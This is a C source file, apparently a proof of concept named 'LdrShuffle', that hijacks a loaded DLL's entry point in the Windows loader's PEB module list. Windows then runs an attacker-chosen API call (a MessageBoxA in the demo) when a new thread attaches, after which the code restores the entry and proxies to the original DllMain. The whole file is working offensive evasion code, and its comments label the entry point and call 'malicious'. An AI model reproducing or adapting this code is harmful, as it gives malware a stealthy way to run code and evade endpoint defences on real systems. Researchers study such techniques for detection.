#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#pragma comment(lib, "ntdll.lib")

// Sacrificial DLL to modify
#define SACRIFICIAL_DLL_NAME L"version.dll"
#define MAX_ARGS 10

// Extended LDR structures (from DarkLoadLibrary by @_batsec_)
typedef struct _LDR_DATA_TABLE_ENTRY2 {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;              // ← This is what we modify
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT TlsIndex;
    union {
        LIST_ENTRY HashLinks;
        struct {
            PVOID SectionPointer;
            ULONG CheckSum;
        };
    };
    union {
        ULONG TimeDateStamp;
        PVOID LoadedImports;
    };
    PVOID EntryPointActivationContext;
    PVOID PatchInformation;
    LIST_ENTRY ForwarderLinks;
    LIST_ENTRY ServiceTagLinks;
    LIST_ENTRY StaticLinks;
    PVOID ContextInformation;
    ULONG_PTR OriginalBase;        // ← We use this to backup EntryPoint
    LARGE_INTEGER LoadTime;
} LDR_DATA_TABLE_ENTRY2, *PLDR_DATA_TABLE_ENTRY2;

// Data structure for API call setup
typedef struct _DATA_T {
    // LDR structures manipulation
    ULONG_PTR runner;              // malicious entry point to execute
    ULONG_PTR bakOriginalBase;     // backup of overwritten OriginalBase
    ULONG_PTR bakEntryPoint;       // backup of overwritten EntryPoint
    HANDLE event;                  // event signalling that the Runner has executed
    // function call
    ULONG_PTR ret;                 // return value
    DWORD createThread;            // run this API call in a new thread
    ULONG_PTR function;            // Windows API to call
    DWORD dwArgs;                  // number of args
    ULONG_PTR args[MAX_ARGS];      // array of args
} DATA_T, *PDATA_T;

// Global data pointer
PDATA_T g_pDataT = NULL;

// Macro helpers for calling functions with different argument counts
typedef ULONG_PTR(__stdcall* APICALL_0)(VOID);
typedef ULONG_PTR(__stdcall* APICALL_1)(ULONG_PTR);
typedef ULONG_PTR(__stdcall* APICALL_2)(ULONG_PTR, ULONG_PTR);
typedef ULONG_PTR(__stdcall* APICALL_3)(ULONG_PTR, ULONG_PTR, ULONG_PTR);
typedef ULONG_PTR(__stdcall* APICALL_4)(ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR);

// Get PEB
#ifdef _WIN64
PPEB GetPEB() {
    return (PPEB)__readgsqword(0x60);
}
#else
PPEB GetPEB() {
    return (PPEB)__readfsdword(0x30);
}
#endif

// Find LDR_DATA_TABLE_ENTRY for a specific DLL
PLDR_DATA_TABLE_ENTRY2 FindLdrEntry(LPCWSTR dllName) {
    PPEB peb = GetPEB();
    if (!peb) return NULL;

    PPEB_LDR_DATA ldr = peb->Ldr;
    if (!ldr) return NULL;

    // Walk InMemoryOrderModuleList
    PLIST_ENTRY head = &ldr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = head->Flink;

    while (entry != head) {
        PLDR_DATA_TABLE_ENTRY2 ldrEntry = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY2, InMemoryOrderLinks);

        if (ldrEntry->BaseDllName.Buffer) {
            if (_wcsicmp(ldrEntry->BaseDllName.Buffer, dllName) == 0) {
                return ldrEntry;
            }
        }

        entry = entry->Flink;
    }

    return NULL;
}

// Update LDR entry to point to our Runner
BOOL UpdateLdr(PDATA_T pDataT, LPCWSTR dllName) {
    PLDR_DATA_TABLE_ENTRY2 ldrEntry = FindLdrEntry(dllName);
    if (!ldrEntry) {
        printf("[-] Failed to find LDR entry for %S\n", dllName);
        return FALSE;
    }

    printf("[+] Found LDR entry for %S\n", dllName);
    printf("    DllBase: 0x%llx\n", (ULONGLONG)ldrEntry->DllBase);
    printf("    EntryPoint: 0x%llx\n", (ULONGLONG)ldrEntry->EntryPoint);
    printf("    OriginalBase: 0x%llx\n", (ULONGLONG)ldrEntry->OriginalBase);

    // Backup original values
    pDataT->bakEntryPoint = (ULONG_PTR)ldrEntry->EntryPoint;
    pDataT->bakOriginalBase = (ULONG_PTR)ldrEntry->OriginalBase;

    // Overwrite EntryPoint to point to Runner
    ldrEntry->EntryPoint = (PVOID)pDataT->runner;

    // Backup original EntryPoint in OriginalBase (we'll restore it later)
    ldrEntry->OriginalBase = (ULONG_PTR)pDataT->bakEntryPoint;

    printf("[+] LDR entry modified:\n");
    printf("    New EntryPoint: 0x%llx (Runner)\n", (ULONGLONG)ldrEntry->EntryPoint);
    printf("    Backup in OriginalBase: 0x%llx\n", (ULONGLONG)ldrEntry->OriginalBase);

    return TRUE;
}

// Restore LDR entry to original state
BOOL RestoreLdr(HINSTANCE hinstDLL, PDATA_T pDataT) {
    PPEB peb = GetPEB();
    if (!peb) return FALSE;

    PPEB_LDR_DATA ldr = peb->Ldr;
    if (!ldr) return FALSE;

    // Find the LDR entry matching the DLL base
    PLIST_ENTRY head = &ldr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = head->Flink;

    while (entry != head) {
        PLDR_DATA_TABLE_ENTRY2 ldrEntry = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY2, InMemoryOrderLinks);

        if (ldrEntry->DllBase == (PVOID)hinstDLL) {
            // Restore original EntryPoint
            ldrEntry->EntryPoint = (PVOID)pDataT->bakEntryPoint;
            ldrEntry->OriginalBase = pDataT->bakOriginalBase;
            return TRUE;
        }

        entry = entry->Flink;
    }

    return FALSE;
}

// Forward declare Runner
VOID Runner(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);

// Helper to run API in a new thread
DWORD WINAPI RunInThread(LPVOID lpParam) {
    PDATA_T pDataT = (PDATA_T)lpParam;

    printf("\t\t[RunInThread][%lu] - about to perform API call\n", GetCurrentThreadId());

    switch (pDataT->dwArgs) {
        case 0:
            pDataT->ret = ((APICALL_0)pDataT->function)();
            break;
        case 1:
            pDataT->ret = ((APICALL_1)pDataT->function)(pDataT->args[0]);
            break;
        case 2:
            pDataT->ret = ((APICALL_2)pDataT->function)(pDataT->args[0], pDataT->args[1]);
            break;
        case 3:
            pDataT->ret = ((APICALL_3)pDataT->function)(pDataT->args[0], pDataT->args[1], pDataT->args[2]);
            break;
        case 4:
            pDataT->ret = ((APICALL_4)pDataT->function)(pDataT->args[0], pDataT->args[1], pDataT->args[2], pDataT->args[3]);
            break;
    }

    SetEvent(pDataT->event);
    return 0;
}

// Runner - This is called by Windows when it thinks it's calling DllMain
VOID Runner(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    printf("\t[Runner][%lu] - called on module 0x%p for reason %lu\n", GetCurrentThreadId(), hinstDLL, fdwReason);

    // Get our DATA_T structure
    PDATA_T pDataT = g_pDataT;
    if (!pDataT) {
        printf("\t[!][Runner][%lu] - pDataT is NULL\n", GetCurrentThreadId());
        return;
    }

    ULONG_PTR bakEntryPoint = pDataT->bakEntryPoint;

    // Restore original entrypoint
    if (!RestoreLdr(hinstDLL, pDataT)) {
        printf("\t[Runner][%lu] - Failed to restore LDR!\n", GetCurrentThreadId());
    }

    // Execute our malicious API call
    if (pDataT->createThread) {
        printf("\t[Runner][%lu] - API set to run in new thread\n", GetCurrentThreadId());
        HANDLE hThread = CreateThread(NULL, 0, RunInThread, pDataT, 0, NULL);
        if (hThread) {
            printf("\t[Runner][%lu] - Created new thread %lu\n", GetCurrentThreadId(), GetThreadId(hThread));
            CloseHandle(hThread);
        }
    }
    else {
        printf("\t[Runner][%lu] - about to perform call in current thread\n", GetCurrentThreadId());

        switch (pDataT->dwArgs) {
            case 0:
                pDataT->ret = ((APICALL_0)pDataT->function)();
                break;
            case 1:
                pDataT->ret = ((APICALL_1)pDataT->function)(pDataT->args[0]);
                break;
            case 2:
                pDataT->ret = ((APICALL_2)pDataT->function)(pDataT->args[0], pDataT->args[1]);
                break;
            case 3:
                pDataT->ret = ((APICALL_3)pDataT->function)(pDataT->args[0], pDataT->args[1], pDataT->args[2]);
                break;
            case 4:
                pDataT->ret = ((APICALL_4)pDataT->function)(pDataT->args[0], pDataT->args[1], pDataT->args[2], pDataT->args[3]);
                break;
        }

        // Signal completion
        SetEvent(pDataT->event);
    }

    // Call the original DllMain that we hijacked (proxy the call)
    if (bakEntryPoint) {
        ((BOOL (WINAPI*)(HINSTANCE, DWORD, LPVOID))bakEntryPoint)(hinstDLL, fdwReason, lpvReserved);
    }

    printf("\t[Runner][%lu] - completed\n", GetCurrentThreadId());
}

// Dummy function to simulate thread creation
DWORD WINAPI DummyFunction(LPVOID lpParam) {
    printf("\t[DummyFunction] - thread %lu started\n", GetCurrentThreadId());
    Sleep(500);
    printf("\t[DummyFunction] - thread %lu exiting\n", GetCurrentThreadId());
    return 0;
}

int main() {
    printf("========================================\n");
    printf("LdrShuffle - EntryPoint Hijacking\n");
    printf("========================================\n\n");

    // Load sacrificial DLL
    printf("[*] Loading sacrificial DLL: %S\n", SACRIFICIAL_DLL_NAME);
    HMODULE hDll = LoadLibraryW(SACRIFICIAL_DLL_NAME);
    if (!hDll) {
        printf("[-] Failed to load %S: %lu\n", SACRIFICIAL_DLL_NAME, GetLastError());
        return 1;
    }
    printf("[+] Loaded at: 0x%llx\n\n", (ULONGLONG)hDll);

    // Allocate DATA_T structure
    PDATA_T pDataT = (PDATA_T)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(DATA_T));
    if (!pDataT) {
        printf("[-] Failed to allocate DATA_T\n");
        return 1;
    }

    g_pDataT = pDataT;

    // Setup MessageBoxA call
    printf("[*] Setting up MessageBoxA() call\n");
    pDataT->runner = (ULONG_PTR)Runner;
    pDataT->event = CreateEventA(NULL, FALSE, FALSE, "ExecEvt");
    pDataT->dwArgs = 4;
    pDataT->function = (ULONG_PTR)MessageBoxA;
    pDataT->args[0] = (ULONG_PTR)NULL;
    pDataT->args[1] = (ULONG_PTR)"Hello from LdrShuffle!";
    pDataT->args[2] = (ULONG_PTR)"EntryPoint Hijacking";
    pDataT->args[3] = (ULONG_PTR)MB_OK;
    pDataT->createThread = 0;  // Run in current thread

    // Modify LDR entry
    printf("\n[*] Modifying LDR entry for %S\n", SACRIFICIAL_DLL_NAME);
    if (!UpdateLdr(pDataT, SACRIFICIAL_DLL_NAME)) {
        printf("[-] Failed to update LDR\n");
        HeapFree(GetProcessHeap(), 0, pDataT);
        return 1;
    }

    // Create a thread to trigger DLL_THREAD_ATTACH event
    printf("\n[*] Press ENTER to create thread and trigger execution...\n");
    getchar();

    printf("[*] Creating dummy thread to trigger DLL_THREAD_ATTACH\n");
    HANDLE hThread = CreateThread(NULL, 0, DummyFunction, NULL, 0, NULL);
    if (!hThread) {
        printf("[-] Failed to create thread: %lu\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, pDataT);
        return 1;
    }

    printf("[*] Created dummy thread: %lu\n", GetThreadId(hThread));

    // Wait for execution to complete
    printf("[*] Waiting for Runner to execute...\n");
    WaitForSingleObject(pDataT->event, INFINITE);

    printf("\n[+] Execution completed!\n");
    printf("[+] Return value: 0x%llx\n", (ULONGLONG)pDataT->ret);

    // Wait for dummy thread to finish
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(pDataT->event);

    // Cleanup
    HeapFree(GetProcessHeap(), 0, pDataT);

    printf("\n[*] Done!\n");
    return 0;
}
